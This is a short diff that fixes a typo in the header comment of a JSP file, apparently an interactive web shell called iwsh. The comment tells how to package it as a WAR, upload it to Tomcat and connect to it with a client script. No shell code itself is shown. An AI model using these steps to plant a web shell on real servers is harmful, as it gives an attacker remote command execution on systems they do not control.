@@ -1,7 +1,7 @@
 <%@ page import="java.util.*,java.io.*"%>
 
 <%/*
-*   Create by NumquamScire for iwsh project.
+*   Created by NumquamScire for iwsh project.
 *   For tomcat: 'zip -r web_app.war iwsh.jsp'
 *       Upload web_app.war
 *       Access to full interactive web shell use client iwsh.sh -u http://localhost/web_app/iwsh.jsp -d 
